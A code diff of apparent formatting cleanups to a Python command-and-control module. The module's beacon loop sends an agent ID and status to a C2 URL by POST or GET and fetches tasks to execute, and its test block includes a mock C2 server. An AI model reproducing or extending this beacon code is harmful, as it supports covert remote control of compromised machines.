@@ -117,7 +117,8 @@ class CommandControl:
 
                 self.logger.debug(f"[Beacon {beacon_id}] Sleeping for {sleep_time:.2f} seconds.")
                 stop_event.wait(timeout=sleep_time) # Use wait() for interruptible sleep
-                if stop_event.is_set(): break # Check again after sleep
+                if stop_event.is_set():
+                    break # Check again after sleep
 
                 # --- Prepare Beacon Data ---
                 beacon_data = {"agent_id": self.agent_id, "timestamp": datetime.now().isoformat(), "status": "beacon"}
@@ -139,7 +140,6 @@ class CommandControl:
                 self.logger.debug(f"[Beacon {beacon_id}] Sending {method} beacon to {c2_url}")
                 response = None
                 task_to_execute = None # Variable to hold received task
-                time.time()
                 try:
                     if method == "POST":
                         response = requests.post(c2_url, headers=headers, json=beacon_data,
@@ -153,10 +153,13 @@ class CommandControl:
 
                         get_params = {}
                         for k, v in beacon_data.items():
-                             if isinstance(v, (dict, list)): # Attempt to JSON encode complex types
-                                  try: get_params[k] = json.dumps(v)
-                                  except Exception: get_params[k] = str(v)[:1000] # Limit length if cannot encode
-                             else: get_params[k] = v
+                            if isinstance(v, (dict, list)):
+                                try:
+                                    get_params[k] = json.dumps(v)
+                                except Exception:
+                                    get_params[k] = str(v)[:1000]
+                            else:
+                                get_params[k] = v
                         response = requests.get(c2_url, headers=headers, params=get_params,
                                                 timeout=timeout, verify=verify_ssl)
 
@@ -454,7 +457,10 @@ if __name__ == '__main__':
                          try:
                               decoded_data = json.loads(received_data[key])
                               mock_c2_logger.info(f"---> Received {len(decoded_data)} {key} items via GET param.")
-                         except Exception as e: mock_c2_logger.warning(f"Could not decode {key} from GET: {e}")
+                         except Exception as decode_err:
+                             mock_c2_logger.warning(
+                                 f"Could not decode {key} from GET: {decode_err}"
+                             )
 
             # Send back tasks
             response_tasks = tasks_to_send[:]
